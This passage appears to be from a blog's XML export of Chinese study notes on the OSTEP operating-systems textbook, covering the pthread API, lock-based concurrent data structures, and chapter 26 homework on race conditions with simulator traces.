        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 27: Interlude: Thread API</title>
    <url>/2022/02/25/OSTEP/OSTEP%20Chapter%2027%20-%20Interlude%20-%20Thread%20API/</url>
    <content><![CDATA[<h2 id="27-1-Thread-Creation"><a href="#27-1-Thread-Creation" class="headerlink" title="27.1 Thread Creation"></a>27.1 Thread Creation</h2><p>创建线程的 API 为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(      <span class="keyword">pthread_t</span>      *thread, </span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">void</span> *         (*start_routine)(<span class="keyword">void</span>*),</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">void</span> *         arg)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>thread 是指向 pthread_t 类型变量的指针，我们将来要通过这个结构体来控制这个线程，所以现在需要对其进行初始化。</li>
<li>attr 表明了希望该线程拥有的属性，大多数情况下可以传 NULL，表示按照默认属性创建。</li>
<li>start_routine 是一个指向函数的指针，新创建的线程会从这个函数开始执行。</li>
<li>arg 是传给 start_routine() 的参数。</li>
</ul>
<span id="more"></span>

<p>这里参数的类型和返回值类型都是 <code>void *</code> 类型的指针 (相当于只要求地址，不要求对地址类型的解读)，这是为了使得函数支持任意类型的参数和返回值。</p>
<h2 id="27-2-Thread-Completion"><a href="#27-2-Thread-Completion" class="headerlink" title="27.2 Thread Completion"></a>27.2 Thread Completion</h2><p>等待线程完成的 API 为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">void</span>      **value_ptr)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>thread 表示要等待运行完成的线程结构体。</li>
<li>value_ptr 是一个指向 <code>void *</code> 类型指针的指针，pthread_join() 返回时， value_ptr 会指向线程创建时的 start_routine() 函数的返回值。如果我们不在乎这个返回值，可以直接传入 NULL。</li>
</ul>
<p>很多时候，我们需要的线程函数返回值只是一个数 (如 0 表示成功，1 表示失败)，这时我们有比较简单的写法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mythread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)(arg + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r; <span class="keyword">pthread_t</span> p;</span><br><span class="line">    pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, (<span class="keyword">void</span> *)<span class="number">100</span>);</span><br><span class="line">    pthread_join(p, (<span class="keyword">void</span> **)&amp;r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在线程函数中将返回值转换成 <code>void *</code> 类型，在主函数中我们只要将整型变量 r 的地址转换成 <code>void **</code> 类型，就可以直接把返回值存到 r 里面。</p>
<p>使用线程返回时要格外注意：返回值的实体不能在线程栈上，因为线程返回时线程栈会被释放。比如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mythread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">myret_t</span> r; r = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)&amp;r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个写法是不合理的，返回时 r 已经被释放，返回结果是 UB。将结构体定义在堆区可以避免这个问题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mythread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">myret_t</span> *r = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">myret_t</span>));</span><br><span class="line">    *r = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="27-3-Locks"><a href="#27-3-Locks" class="headerlink" title="27.3 Locks"></a>27.3 Locks</h2><p>用于获得互斥锁和释放互斥锁的 API 为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_lock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_unlock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br></pre></td></tr></table></figure>

<p>第一个函数会尝试获得锁，直到获得了之后返回 (互斥锁不会轮询锁的状态，在得不到时会进入睡眠状态)。第二个第二个函数用于释放锁。</p>
<p>注：这两个函数是有返回值的。正常情况下它们应该返回 0。一个好的编程习惯是在调用这些 API 时随手检查返回值，比如封装成这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pthread_mutex_lock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = pthread_mutex_lock(mutex);</span><br><span class="line">    assert(rc == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>互斥锁在使用之前需要先初始化。初始化有两种方式：</p>
<ul>
<li><p>在定义互斥锁变量时直接使用 INITIALIZER，它会按照默认属性初始化锁：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br></pre></td></tr></table></figure></li>
<li><p>在运行过程中初始化：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Pthread_mutex_init</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = pthread_mutex_init(mutex, <span class="literal">NULL</span>);</span><br><span class="line">    assert(rc == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> lock;</span><br><span class="line">    Pthread_mutex_init(&amp;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  pthread_mutex_init() 的第二个参数用于指定初始化锁的属性，通常情况下使用 NULL 即可。</p>
</li>
</ul>
<p>锁用完之后，应当使用和初始化函数相对应的 pthread_mutex_destroy() 函数来销毁一个锁。</p>
<p>另有两个 API：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_trylock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_mutex_timedlock</span><span class="params">(<span class="keyword">pthread_mutex_t</span> *mutex,</span></span></span><br><span class="line"><span class="params"><span class="function">                            struct timespec *abs_timeout)</span></span>;</span><br></pre></td></tr></table></figure>

<p>trylock() 会尝试获得锁，如果锁正在被占用则直接返回。timedlock() 会在一个指定的时间范围内尝试获得锁，如果这个时间段内未能获得锁就返回。trylock() 可以理解为 timedlock() 的 0 秒版本；之前的 lock() 可以理解为 timedlock() 的无限长时间版本。</p>
<p>这两个 API 不常用，但在一些情境下可以用于避免死锁。</p>
<h2 id="27-4-Condition-Variables"><a href="#27-4-Condition-Variables" class="headerlink" title="27.4 Condition Variables"></a>27.4 Condition Variables</h2><p>条件变量的两个主要 API 为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_wait</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cond, <span class="keyword">pthread_mutex_t</span> *mutex)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_signal</span><span class="params">(<span class="keyword">pthread_cond_t</span> *cond)</span></span>;</span><br></pre></td></tr></table></figure>

<p>调用 cond_wait() 时，当前线程必须已经拥有互斥锁 mutex。cond_wait() 会释放 mutex 并将当前线程睡眠在条件变量 cond 上。当另外的某个线程调用 cond_signal() 唤醒了该线程时，该线程会重新尝试获得互斥锁 mutex，获得了之后从 cond_wait() 函数返回。</p>
<p>使用条件变量之前要先对条件变量初始化，其方法和互斥锁是类似的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pthread_cond_t</span> cond = PTREAD_COND_INITALIZER;</span><br></pre></td></tr></table></figure>

<h2 id="27-5-Compiling-and-Running"><a href="#27-5-Compiling-and-Running" class="headerlink" title="27.5 Compiling and Running"></a>27.5 Compiling and Running</h2><p>要使用上述的 POSIX 线程库中的函数，我们需要在源代码中 <code>#include &lt;pthread.h&gt;</code> ，并在编译时加入 <code>-lpthread</code> 选项。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 29: Lock-based Concurrent Data Structures</title>
    <url>/2022/02/23/OSTEP/OSTEP%20Chapter%2029%20-%20Lock-based%20Concurrent%20Data%20Structures/</url>
    <content><![CDATA[<h2 id="29-1-Concurrent-Counters"><a href="#29-1-Concurrent-Counters" class="headerlink" title="29.1 Concurrent Counters"></a>29.1 Concurrent Counters</h2><p>一个最简单的 thread-safe 的计数器实现如下 (用锁保护每次读写)：</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">counter_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> lock;</span><br><span class="line">&#125; <span class="keyword">counter_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">counter_t</span> *c)</span> </span>&#123;</span><br><span class="line">    c-&gt;value = <span class="number">0</span>;</span><br><span class="line">    Pthread_mutex_init(&amp;c-&gt;lock, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">(<span class="keyword">counter_t</span> *c)</span> </span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;c-&gt;lock);</span><br><span class="line">    c-&gt;value++;</span><br><span class="line">    Pthread_mutex_unlock(&amp;c-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrement</span><span class="params">(<span class="keyword">counter_t</span> *c)</span> </span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;c-&gt;lock);</span><br><span class="line">    c-&gt;value--;</span><br><span class="line">    Pthread_mutex_unlock(&amp;c-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">counter_t</span> *c)</span> </span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;c-&gt;lock);</span><br><span class="line">    <span class="keyword">int</span> rc = c-&gt;value;</span><br><span class="line">    Pthread_mutex_unlock(&amp;c-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但这种实现的 scalability 很差：如果给 $n$ 个核分配等量的任务，最终所消耗的时间几乎是单个任务时长的 $n$ 倍。大部分时间 CPU 核之间在互相等锁，我们没有利用多处理器达到并行的效率。</p>
<p>如果愿意牺牲一部分精确性，我们可以设计一种 approximate counter 来提升效率。approximate counter 中，每个 CPU 核有一个单独的 counter，此外还有一个全局的 counter。全局和本地的 counter 都有锁保护。修改操作中 (假设只有 increment)，CPU 核直接修改本地的 counter，因此各个核可以并行。当本地 counter 的值达到一个阈值时，本地 counter 会和全局 counter 做一次同步，将本地值加到全局值上并将本地值清零。查询操作中直接返回全局 counter 的值即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">counter_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>             global;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> glock;</span><br><span class="line">    <span class="keyword">int</span>             local[NUMCPUS];</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> llock[NUMCPUS];</span><br><span class="line">    <span class="keyword">int</span>             threshold;</span><br><span class="line">&#125;<span class="keyword">counter_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">counter_t</span> *c, <span class="keyword">int</span> threshold)</span> </span>&#123;</span><br><span class="line">    c-&gt;threshold = threshold;</span><br><span class="line">    c-&gt;global = <span class="number">0</span>;</span><br><span class="line">    Pthread_mutex_init(&amp;c-&gt;glock, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUMCPUS; ++i) &#123;</span><br><span class="line">        c-&gt;local[i] = <span class="number">0</span>;</span><br><span class="line">        Pthread_mutex_init(&amp;c-&gt;llock[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">counter_t</span> *c, <span class="keyword">int</span> threadID, <span class="keyword">int</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpu = threadID % NUMCPUS;</span><br><span class="line">    Pthread_mutex_lock(&amp;c-&gt;llock[cpu]);</span><br><span class="line">    c-&gt;local[cpu] += amt;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;local[cpu] &gt;= c-&gt;threshold) &#123;</span><br><span class="line">        Pthread_mutex_lock(&amp;c-&gt;glock);</span><br><span class="line">        c-&gt;glocal += c-&gt;local[cpu];</span><br><span class="line">        Pthread_mutex_unlock(&amp;c-&gt;glock);</span><br><span class="line">        c-&gt;local[cpu] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Pthread_mutex_unlock(&amp;c-&gt;llock[cpu]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">counter_t</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;c-&gt;glock);</span><br><span class="line">    <span class="keyword">int</span> rt = c-&gt;global;</span><br><span class="line">    Pthread_mutex_unlock(&amp;c-&gt;glock);</span><br><span class="line">    <span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在该实现版本中，每个线程并不会去确认自己所处的核，而是直接随机 (进程号取模) 分配一个核对应的本地计数器。这样做和之前描述的算法无异。</p>
<p>上述算法中，如果阈值是 0 则与精确的计数器无异。随着阈值的提高，计数器的并行效率会越来越高 (大致呈反比例函数)，但返回的结果会越来越不精确。</p>
<h2 id="29-2-Concurrent-Linked-List"><a href="#29-2-Concurrent-Linked-List" class="headerlink" title="29.2 Concurrent Linked List"></a>29.2 Concurrent Linked List</h2><p>一个朴素的做法是用一把大锁保护整个链表的修改和查询。一种很容易出错的情形是：如果函数中间有多处 return，则每处 return 前都要记得释放锁。为了避免这种 bug，书写代码时可以考虑多用 break 替代 return 减少 return 分支数，或者另写一个 wrapper 调用真正的函数，在 wrapper 中维护锁。</p>
<p>一种增加链表访问并行度的方案是所谓的 hand-over-hand locking (lock coupling)。在查询链表中是否有某个元素时，我们平常的做法是用一个大锁保护整个链表，然后依次扫描链表节点。hand-over-hand locking 的思想是为每个链表节点创建一把锁，每次准备访问下一个节点时，先获得下一个节点的锁，再释放本节点的锁。这样多个线程就可以并行地查询链表。</p>
<p>这个方案在理论上可行，但实际操作中，频繁地获得和释放锁会带来昂贵的代价。一个更可行的方案是每 $n$ 个节点用一把锁保护，准备进入下一个“区域”时做一次 overhead acquiring and releasing。</p>
<h2 id="29-3-Concurrent-Queues"><a href="#29-3-Concurrent-Queues" class="headerlink" title="29.3 Concurrent Queues"></a>29.3 Concurrent Queues</h2><p>我们可以在队头和队尾分别维护一把锁，这样从队头取元素和向队尾添加元素的操作可以并行地执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">node_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>              val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">node_t</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;<span class="keyword">node_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">queue_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">node_t</span>          *head;</span><br><span class="line">    <span class="keyword">node_t</span>          *tail;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span>  headlock;</span><br><span class="line">    <span class="keyword">pthread_mutex_t</span>  taillock;</span><br><span class="line">&#125;<span class="keyword">queue_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queue_init</span><span class="params">(<span class="keyword">queue_t</span> *q)</span> </span>&#123;</span><br><span class="line">    node *tmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">node_t</span>));</span><br><span class="line">    tmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    q-&gt;head = q-&gt;tail = tmp;</span><br><span class="line">    pthread_mutex_init(&amp;q-&gt;headlock, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_mutex_init(&amp;q-&gt;taillock, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_enqueue</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    node *tmp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">node_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    tmp-&gt;val = val; tmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    pthread_mutex_lock(&amp;q-&gt;taillock);</span><br><span class="line">    q-&gt;tail-&gt;next = tmp;</span><br><span class="line">    q-&gt;tail = tmp;</span><br><span class="line">    pthread_mutex_unlock(&amp;q-&gt;taillock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_dequeue</span><span class="params">(<span class="keyword">queue_t</span> *q, <span class="keyword">int</span> *val)</span> </span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;q-&gt;headlock);</span><br><span class="line">    node *tmp = q-&gt;head;</span><br><span class="line">    node *newhead = tmp-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (newhead == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        pthread_mutex_unlock(&amp;q-&gt;headlock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// queue was empty</span></span><br><span class="line">    &#125;</span><br><span class="line">    *val = tmp-&gt;val;</span><br><span class="line">    q-&gt;head = newhead;</span><br><span class="line">    pthread_mutex_unlock(&amp;q-&gt;headlock);</span><br><span class="line">    <span class="built_in">free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的一个重要的技巧是：我们在初始化队列时创建了一个 dummy node，并让 <code>q-&gt;head</code> 和 <code>q-&gt;tail</code> 都指向它。这个 dummy node 是永远不会出队的。这样我们避免了队列在形状上完全为空的情况，从而保证 headlock 和 taillock 做的工作永远是没有交叉的。</p>
<h2 id="29-4-Concurrent-Hash-Table"><a href="#29-4-Concurrent-Hash-Table" class="headerlink" title="29.4 Concurrent Hash Table"></a>29.4 Concurrent Hash Table</h2><p>一个支持并发访问的 Hash table 实现很简单：使用多个之前提到的链表即可：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUCKETS (101)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">hash_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_t</span> lists[BUCKETS];</span><br><span class="line">&#125;<span class="keyword">hash_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hash_Init</span><span class="params">(<span class="keyword">hash_t</span> *H)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BUCKETS; i++)</span><br><span class="line">        List_Init(&amp;H-&gt;lists[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Hash_Insert</span><span class="params">(<span class="keyword">hash_t</span> *H, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bucket = key % BUCKETS;</span><br><span class="line">    <span class="keyword">return</span> List_Insert(&amp;H-&gt;lists[bucket], key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Hash_Lookup</span><span class="params">(<span class="keyword">hash_t</span> *H, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bucket = key % BUCKETS;</span><br><span class="line">    <span class="keyword">return</span> List_Lookup(&amp;H-&gt;lists[bucket], key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个实现在实际中效率不低的原因是：我们并没有用一把大锁保护整个哈希表，而是对每个链表单独用一把所保护。多个线程同时访问哈希表的一个 bucket 的几率较低，这使得 lock contention 发生次数较少。</p>
<blockquote>
<p><strong>Tip: Avoid Premature Optimization</strong></p>
<p>“Premature Optimization is the root of all evil.” - Knuth</p>
<p>很多操作系统内核开发时，都是先使用一个大内核锁 (big kernel lock, BKL)，先保证正确性，再考虑如何把锁拆开提升效率。</p>
</blockquote>
<h2 id="29-5-Summary"><a href="#29-5-Summary" class="headerlink" title="29.5 Summary"></a>29.5 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 26 - Homework</title>
    <url>/2022/02/26/OSTEP/OSTEP%20Homework%2026/</url>
    <content><![CDATA[<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><ol>
<li>Let’s examine a simple program, “loop.s”. First, just read and understand it. Then, run it with these arguments (<code>./x86.py -p loop.s -t 1 -i 100 -R dx</code>) This specifies a single thread, an interrupt every 100 instructions, and tracing of register %dx. What will %dx be during the run? Use the -c flag to check your answers; the answers, on the left, show the value of the register (or memory value) after the instruction on the right has run. <span id="more"></span></li>
<li>Same code, different flags: (<code>./x86.py -p loop.s -t 2 -i 100 -a dx=3,dx=3 -R dx</code>) This specifies two threads, and initializes each %dx to 3. What values will %dx see? Run with -c to check. Does the presence of multiple threads affect your calculations? Is there a race in this code?</li>
<li>Run this: <code>./x86.py -p loop.s -t 2 -i 3 -r -a dx=3,dx=3 -R dx</code> This makes the interrupt interval small/random; use different seeds (-s) to see different interleavings. Does the interrupt frequency change anything?</li>
<li>Now, a different program, looping-race-nolock.s, which accesses a shared variable located at address 2000; we’ll call this variable value. Run it with a single thread to confirm your understanding: <code>./x86.py -p looping-race-nolock.s -t 1 -M 2000 </code> What is value (i.e., at memory address 2000) throughout the run? Use -c to check.</li>
<li>Run with multiple iterations/threads: <code>./x86.py -p looping-race-nolock.s -t 2 -a bx=3 -M 2000</code> Why does each thread loop three times? What is final value of value?</li>
<li>Run with random interrupt intervals: <code>./x86.py -p looping-race-nolock.s -t 2 -M 2000 -i 4 -r -s 0</code> with different seeds (-s 1, -s 2, etc.) Can you tell by looking at the thread interleaving what the final value of value will be? Does the timing of the interrupt matter? Where can it safely occur? Where not? In other words, where is the critical section exactly?</li>
<li>Now examine fixed interrupt intervals: <code>./x86.py -p looping-race-nolock.s -a bx=1 -t 2 -M 2000 -i 1</code> What will the final value of the shared variable value be? What about when you change -i 2, -i 3, etc.? For which interrupt intervals does the program give the “correct” answer?</li>
<li>Run the same for more loops (e.g., set -a bx=100). What interrupt intervals (-i) lead to a correct outcome? Which intervals are surprising?</li>
<li>One last program: wait-for-me.s. Run: <code>./x86.py -p wait-for-me.s -a ax=1,ax=0 -R ax -M 2000</code> This sets the %ax register to 1 for thread 0, and 0 for thread 1, and watches %ax and memory location 2000. How should the code behave? How is the value at location 2000 being used by the threads? What will its final value be?</li>
<li>Now switch the inputs: <code>./x86.py -p wait-for-me.s -a ax=0,ax=1 -R ax -M 2000</code> How do the threads behave? What is thread 0 doing? How would changing the interrupt interval (e.g., <code>-i 1000</code>, or perhaps to use random intervals) change the trace outcome? Is the program efficiently using the CPU?</li>
</ol>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><ol>
<li><p>%dx 寄存器初始值为 0，执行一次 sub 指令后变为 -1，随后跳出循环。</p>
</li>
<li><p>%dx 从 3 开始每做一次循环 -1,直到变为负数后退出。两个线程的行为是完全一样的。多线程没有影响计算，这里没有出现竞争条件。</p>
</li>
<li><p>中断的频率不会对线程行为产生任何影响。<code>loop.s</code> 中只有针对寄存器的行为，不同线程的寄存器之间是互相独立的。</p>
</li>
<li><p>循环只做了一次，地址 2000 处最终数值为 1。</p>
</li>
<li><p>%bx 寄存器的初始值为 3，所以每个线程做三次循环，最终地址 2000 处的值为 6。</p>
</li>
<li><p>使用 0 和 2 做种子可以得到正确的结果 2，因为两个线程临界区域的代码没有交叉：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># seed = 0</span><br><span class="line"> 2000      bx          Thread 0                Thread 1         </span><br><span class="line">    0       0   </span><br><span class="line">    0       0   1000 mov 2000, %ax</span><br><span class="line">    0       0   1001 add $1, %ax</span><br><span class="line">    1       0   1002 mov %ax, 2000</span><br><span class="line">    1      -1   1003 sub  $1, %bx</span><br><span class="line">    1       0   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">    1       0                            1000 mov 2000, %ax</span><br><span class="line">    1       0                            1001 add $1, %ax</span><br><span class="line">    2       0                            1002 mov %ax, 2000</span><br><span class="line">    2      -1                            1003 sub  $1, %bx</span><br><span class="line">    2      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">    2      -1   1004 test $0, %bx</span><br><span class="line">    2      -1   1005 jgt .top</span><br><span class="line">    2      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">    2      -1                            1004 test $0, %bx</span><br><span class="line">    2      -1                            1005 jgt .top</span><br><span class="line">    2      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">    2      -1   1006 halt</span><br><span class="line">    2      -1   ----- Halt;Switch -----  ----- Halt;Switch -----  </span><br><span class="line">    2      -1                            1006 halt</span><br></pre></td></tr></table></figure>

<p> 使用 1 做种子会得到错误的结果 1，因为两个线程的临界区域出现了交叉 (第一个线程做了第一条指令后切换到了第二个线程)。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2000      bx          Thread 0                Thread 1         </span><br><span class="line">   0       0   </span><br><span class="line">   0       0   1000 mov 2000, %ax</span><br><span class="line">   0       0   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">   0       0                            1000 mov 2000, %ax</span><br><span class="line">   0       0                            1001 add $1, %ax</span><br><span class="line">   1       0                            1002 mov %ax, 2000</span><br><span class="line">   1      -1                            1003 sub  $1, %bx</span><br><span class="line">   1       0   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">   1       0   1001 add $1, %ax</span><br><span class="line">   1       0   1002 mov %ax, 2000</span><br><span class="line">   1      -1   1003 sub  $1, %bx</span><br><span class="line">   1      -1   1004 test $0, %bx</span><br><span class="line">   1      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">   1      -1                            1004 test $0, %bx</span><br><span class="line">   1      -1                            1005 jgt .top</span><br><span class="line">   1      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">   1      -1   1005 jgt .top</span><br><span class="line">   1      -1   1006 halt</span><br><span class="line">   1      -1   ----- Halt;Switch -----  ----- Halt;Switch -----  </span><br><span class="line">   1      -1   ------ Interrupt ------  ------ Interrupt ------  </span><br><span class="line">   1      -1                            1006 halt</span><br></pre></td></tr></table></figure>

<p> 只有两个线程在执行临界区域代码时保持原子性 (不被打断)，才能得到正确的结果。临界区域为：</p>
